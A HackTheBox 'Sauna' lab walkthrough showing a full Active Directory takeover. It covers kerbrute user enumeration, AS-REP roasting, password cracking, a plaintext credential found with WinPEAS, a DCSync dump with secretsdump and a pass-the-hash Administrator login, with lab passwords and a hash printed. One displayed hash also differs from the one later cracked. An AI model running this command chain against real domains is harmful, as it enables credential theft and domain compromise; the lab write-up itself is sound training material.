# Sauna Walkthrough


# Sauna
## Scanning and enumeration
Once connected to the VPN and the hackthebox machine started the scanning and enumeration phase by launching the nmap tool by performing a port scan to get services and versions of open ports.

We started the machine by launching a port scan with nmap.
```bash
    nmap  -T4 -p- -A  10.10.10.175
```

```bash
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 13:43 EST
    Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
    Parallel DNS resolution of 1 host. Timing: About 0.00% done
    Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 0.13% done
    Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 1.62% done; ETC: 13:53 (0:10:07 remaining)
    Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 2.25% done; ETC: 13:52 (0:08:41 remaining)
    Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 2.61% done; ETC: 13:51 (0:08:04 remaining)
    Stats: 0:02:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
    Service scan Timing: About 75.00% done; ETC: 13:45 (0:00:13 remaining)
    Stats: 0:03:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.96% done; ETC: 13:46 (0:00:00 remaining)
    Nmap scan report for 10.10.10.175
    Host is up (0.040s latency).
    Not shown: 65515 filtered tcp ports (no-response)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Egotistical Bank :: Home
    | http-methods: 
    |_  Potentially risky methods: TRACE
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-06 01:45:04Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    9389/tcp  open  mc-nmf        .NET Message Framing
    49668/tcp open  msrpc         Microsoft Windows RPC
    49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49674/tcp open  msrpc         Microsoft Windows RPC
    49677/tcp open  msrpc         Microsoft Windows RPC
    49689/tcp open  msrpc         Microsoft Windows RPC
    49696/tcp open  msrpc         Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2019 (89%)
    Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb2-time: 
    |   date: 2023-11-06T01:46:05
    |_  start_date: N/A
    |_clock-skew: 7h00m00s
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled and required
    
    TRACEROUTE (using port 139/tcp)
    HOP RTT      ADDRESS
    1   40.04 ms 10.10.14.1
    2   40.24 ms 10.10.10.175
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 206.70 seconds
```

Observing the result, I see that it is a domain controller and that the domain is EGOTISTICAL-BANK.LOCAL and the first thing I can think of is how to get valid users of the domain controller.

First I launch the rpcclient tool to see if I can get users but I'm not successful as the null session is not enabled (access without credentials).
```bash
    rpcclient -U '' 10.10.10.175 -c 'enumdomusers'
```

Then I will make an enumeration of the ldap service in search of users.
```bash
    ldapsearch -H ldap://10.10.10.175 -x -s base namingcontexts
    
    #Obtengo el dominio
    
    ldapsearch -H ldap://10.10.10.175 -x -b "DC=EGOTISTICAL-BANK,DC=local"
```

Looking at the tool output I see Hugo's name

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled.png)

Users’ names in a domain controller usually form with the first letter of the name followed by the last name.

Knowing this I create a list of possible names.
```bash
    hugosmith
    h.smith
    hugo.smith
    hsmith
```
With the  port 88 open  of kerberos I use the kerbrute tool to validate users.

Link [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

```bash
    git clone https://github.com/ropnop/kerbrute.git
    #Dentro del directorio creado
    go build -ldflags "-s -w" .
    upx kerbrute
```
I launch the tool with the possible names file.
```bash
    ./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local  users.txt
```
![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%201.png "")

I get that the hsmith user is valid for what I'm worth trying to perform an ASREProast attack in search of some hash but I don't have
```bash
    /opt/impacket/examples/GetNPUsers.py  EGOTISTICAL-BANK.local/hsmith -no-pass -dc-ip 10.10.10.175
```
I'm going to search the web for more users and find them.

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%202.png "")

As we already know the user name format, I create a list with the new users.
```bash
    hsmith
    fsmith
    scoins
    hbear
    btaylor
    sdriver
    skerb
```
## Explotation 
Launch the kerbrute tool again with the new list
```bash
    ./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local  users.txt
```
![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%203.png "")

And we get a hash
```bash

    $krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:d4b3b166aac99836201bbe442d83f8cd$484c733a9d5ce4f6f20f4b522a7b721609c0dacefb845b4f7c1e49a8d1b1886611fba87622cef20aff5ba5447b10f3da794c393744cd2678e94e9ba2ba92a0d29e202ec1d864885b9a9f6a5df463b11587dbc48f3bc0424f710d43ac0d8555b38379f35c1b94a4892669fde4d69cf2bf001f9b792e2180c6f1ea53a28f8900a93e5111c161948f91a64be36c5c8c854d8d90203ce6aab155bde6d3908e8a5c3143fe98830852f808ff8badd93090a4b29421c27a5aba7f98d66ffaa31a292b7b04415d2e0a93b1fba14a5a5f7f614bf0677e9b53c8f7673becdd9873390fc64f8231c99c14846280f5858e81eb472cbaa30156a5ddf7f4a8a641758ccb19775e9f6c8156ceda4f1485078e48b4b7fc6a44cd0ca8aa80
```
We cracked it with
```bash
    echo '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9954ba527554fb3bede345eec9cdb16$96156f42762421bd97ebf37e092cfffebf37bde8f60743e36f9d7f78c1f0b18f7150361cda4e8f48cbc6b73800a480bb728497ef44355869649c910ba1fe98a5212f7a160a011316a703857fc2cd0d0ce24b527a97fc75f3205931a7caf7c01f329c76313cbf696df729fa52acadf61e9275a10d2fe9bf89bb2c0ae8ea6cfa419ae71cfbdcf554cb1685597c3e764861459a0dfa6b92bb2f5432cefb7ed57cfcc423176b9e2b454675711837b4ca1d17ef0188b4befa8f52d873ccd3e87b337b390fe1eae5a1654b14c596fb5ae16c2c160d48b57e247a765f616cd6cb6a8b7bf02a92100070367128f0a7267397874ed038fbeb13631f3ab51edead31e36609' &gt; hash.txt
```
```bash
    john -w=/usr/share/wordlists/rockyou.txt hash.txt
```
![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%204.png "")

I login with winmr 
```bash
    evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
```
## Privilege Escalation
Once in the system I pass WinPeas in search of being able to escalate privileges and i find the following password in plain text.

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%205.png)

If we try to initiate session with the svc_loanmanager user but  we will not succeed if we perform the next command we will see the users of the system
```bash
    net user
```
![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%206.png "")

We notice that the name is svc_loanmgr

We are now in session with the new user
```bash
    evil-winrm -u svc_loanmgr -p Moneymakestheworldgoround! -i 10.10.10.175
```
After an enumeration I see that I have the same permissions as the fsmith user.

So I try to use BloodHound

Transfer SharpHound ps1 to the machine.
```bash
    #On kali
    locate SharpHound.ps1
    cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 .
    #on  winrm
    upload SharpHound.ps1
    #Import
    . .\SharpHound.ps1
    # run it
    Invoke-BloodHound -CollectionMethod All
    #Transfer the zip to our machine
    download 20231106220357_BloodHound.zip
```
![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%207.png "")

We started
```bash
    sudo bloodhound
```
We look for the names of the users we have access to and dial them as owned after we see that we can make a Dcsync attack by clicking the analyst section the Find Shortest Paths to domain

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%208.png "")

We click where DCSync says, select and indicate how to perform the DCSync

![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%209.png "")

With secretdump we get the hashes to make a PasstheHash
```bash
    /opt/impacket/examples/secretsdump.py 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.10.10.175
```
![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2010.png "")

We connect with
```bash
    evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175
```
![Untitled](Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2011.png "")

and we get a powershell as administrator.

